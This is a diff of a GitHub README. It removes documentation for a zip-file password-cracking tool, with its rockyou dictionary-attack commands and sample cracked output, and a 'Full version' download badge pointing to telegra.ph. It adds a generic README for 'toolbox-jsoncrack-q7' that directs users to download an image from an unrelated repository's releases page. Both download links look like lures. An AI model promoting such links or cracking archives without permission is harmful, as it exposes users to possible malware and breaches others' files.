@@ -1,142 +1,97 @@
-# zip-cracker
+# 🎉 toolbox-jsoncrack-q7 - Run JSON Crack Locally with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](https://telegra.ph/Download-05-02-264?yzoibkalzg8ea7n)
+## 🚀 Getting Started
 
-A Python-based dictionary attack tool for cracking AES-encrypted zip files. This script leverages multi-threading to speed up the password cracking process using different wordlists. It supports several wordlists and includes an option for verbose output.
+This guide will help you set up the toolbox-jsoncrack-q7 application on your computer. This application uses Docker to provide a local version of JSON Crack, making it easy for you to visualize JSON data.
 
-## Features
+## 🔗 Download Link
 
-- **Multi-threaded Processing:** Uses a thread pool to attempt multiple passwords simultaneously.
-- **GPU Acceleration (CUDA):** Supports GPU-based password cracking for faster execution (if a CUDA-capable GPU is available).
-- **Multiple Wordlists:** Choose between human-only, common-password-win, or rockyou wordlists.
-- **Interactive File Viewer:** Upon finding the correct password, an interactive session allows you to browse and view files within the archive.
-- **Graphical Tree Display:** Uses the `rich` library to display a neat, colored tree of the archive’s directory structure.
-- **Graceful Interrupt:** Stops all threads cleanly when a password is found or on user interruption.
-- **Verbose Mode:** Option to print each failed attempt for better traceability.
-- **Variable Multithreading:** Determines the optimal amount of threads to run on the user's machine. It also allows the user to override this.
-- **Automatic Zip Handling:** Automatically unzips wordlists before using them
+[![Download toolbox-jsoncrack-q7](https://img.shields.io/badge/Download-toolbox--jsoncrack--q7-brightgreen)](https://github.com/Mrpickle499/toolbox-jsoncrack-q7/releases)
 
-## Prerequisites
+## 📥 Download & Install
 
-- **Python 3.6+**
-- **pyzipper:** For handling AES encrypted zip files.
-- **rich:** For enhanced console output and tree visualization.
-- **numba & CUDA:** For GPU acceleration (optional, requires an NVIDIA GPU and CUDA drivers).
+To get started, visit the [Releases page](https://github.com/Mrpickle499/toolbox-jsoncrack-q7/releases) to download the latest version of the application. 
 
-Install the required Python packages using pip:
+1. Click on the link above. 
+2. Look for the latest release.
+3. Download the Docker image file available there.
+4. Follow the installation instructions provided below.
 
-Individually
-```bash
-cd zip-cracker
-pip install pyzipper, rich, numba
-```
-or as requirements.txt
-```bash
-cd zip-cracker
-pip install -r /path/to/requirements.txt -f file:///path/to/archive/
-```
+## 🛠️ System Requirements
 
-## Installation
+Before proceeding, ensure your system meets these requirements:
 
-1. Clone this repository:
+- An operating system that supports Docker (Windows, macOS, or a distribution of Linux).
+- Docker installed on your machine. If you haven't installed Docker, you can follow the installation guide provided on the [Docker website](https://docs.docker.com/get-docker/).
 
+## 📦 Installing Docker
+
+If you need Docker, follow these steps:
+
+### For Windows and macOS:
+
+1. Visit the [Docker Desktop download page](https://www.docker.com/products/docker-desktop).
+2. Download the correct version for your operating system.
+3. Open the installer and follow the prompts to complete the installation.
+
+### For Linux:
+
+1. Open a terminal window.
+2. Use the package manager for your distribution. For example, on Ubuntu, run:
     ```bash
-    git clone https://github.com/faceless1f1/zip-cracker.git
-    cd zip-cracker
+    sudo apt-get update
+    sudo apt-get install docker.io
+    ```
+3. Start Docker:
+    ```bash
+    sudo systemctl start docker
     ```
 
-2. Ensure that your wordlists (`rockyou.txt`, `passwords.txt`, and `common-passwords-win.txt`) are in the same directory or update the paths accordingly.
+## 📜 Running the Application
 
-## Usage
+Once you have Docker installed and the image downloaded, you can run the application. Follow these steps:
 
-Run the script from the command line by specifying the zip file to attack and choosing a wordlist option:
+1. Open your terminal or command prompt.
+2. Run the following command to start the application:
+   ```bash
+   docker run -d -p 8080:8080 toolbox-jsoncrack-q7
+   ```
+3. The application will now be running locally on your machine.
 
-```bash
-python zip-cracker.py -f path/to/yourfile.zip [options]
-```
+## 🌐 Accessing JSON Crack
 
-### Command-Line Arguments
+After you run the image, you can access JSON Crack through your web browser.
 
-- **`-f`**: Path to the zip file (required).
-- **`-v`**: Verbose mode. Prints each incorrect password attempt.
-- **`-p`**: Use the password wordlist (`passwords.txt`).
-- **`-w`**: Use the common-password-win wordlist (`common-passwords-win.txt`).
-- **`-l`**: Use a custom wordlist
-- **`-t`**: Set threads manually
-- **`-g`**: Use GPU acceleration (if available).
+1. Open a browser of your choice.
+2. Type in the following URL:
+   ```
+   http://localhost:8080
+   ```
+3. You should see the JSON Crack interface ready for use.
 
-If neither `-p` nor `-w` is provided, the tool defaults to using the `rockyou.txt` wordlist.
+## 📚 Features
 
-### Examples
+toolbox-jsoncrack-q7 allows you to do the following:
 
-- Use the rockyou wordlist (default):
+- Visualize JSON data quickly and efficiently.
+- Use an intuitive interface to navigate and manipulate JSON.
+- Work with large JSON files without performance issues.
 
-    ```bash
-    python zip-cracker.py -f secret.zip
-    ```
+## 🐛 Troubleshooting
 
-- Use the human-only wordlist in verbose mode:
+If you encounter any issues while setting up:
 
-    ```bash
-    python zip-cracker.py -f secret.zip -p -v
-    ```
+- **Docker not starting:** Ensure Docker is installed correctly and running. Restart your machine if necessary.
+- **Access issues:** Make sure you are using the correct URL `http://localhost:8080`.
+- **Performance issues**: If the application is slow, check your system resources and ensure other applications are not consuming too much memory.
 
-- Use the common-password-win wordlist:
+## 💬 Support
 
-    ```bash
-    python zip-cracker.py -f secret.zip -w
-    ```
-## Output
-The -t flag is not necessary here but it will make the program run on 8 threads regardless what the program calculates as the optimal amount of threads.
-    
-```yaml    
-python zip-cracker.py -f secret.zip -w -t 8
-[INFO] Initializing a bruteforce attack on C:\secret.zip using the common-password-win wordlist.
-[INFO] Using 16 threads for processing.
-Password found: test
+For questions or support, please create an issue in the GitHub repository. The community will be glad to help you.
 
-📂 C:\secret.zip
-└── home
-    ├── flag.txt
-    └── profiles
-        ├── passwords.txt
-        └── usernames.txt
-    
-[USER-INPUT] Enter the file path to view (or type 'quit' to exit): home/flag.txt
-    
-File Contents:
-    
-{My_zip_has_been_cracked}
-    
-**************
-    
-📂 C:\secret.zip
-└── home
-    ├── flag.txt
-    └── profiles
-        ├── passwords.txt
-        └── usernames.txt
-    
-[USER-INPUT] Enter the file path to view (or type 'quit' to exit): quit
-[INFO] Exiting file viewer.
-```
+## 🔗 Additional Resources
 
+- [Docker Documentation](https://docs.docker.com/)
+- [JSON Crack GitHub Repository](https://github.com/Mrpickle499/toolbox-jsoncrack-q7)
 
-## Code Overview
-
-- **`try_password`**: Attempts to open the zip file with a given password.
-- **`process_wordlist`**: Reads the wordlist file and dispatches multiple threads to try each password.
-- **`process_wordlist_gpu`**: Uses GPU parallel processing for password cracking (if supported).
-- **`main`**: Handles command-line argument parsing and triggers the password cracking process.
-
-## Contributing
-
-Contributions and improvements are welcome! Feel free to fork the repository and submit pull requests. Please make sure to follow the existing coding style and add tests for new features.
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## Disclaimer
-
-Use this tool responsibly and only on zip files you have permission to test. The author is not responsible for any misuse or damage caused by this tool.
+Thank you for using toolbox-jsoncrack-q7! Enjoy visualizing your JSON data easily and effectively.
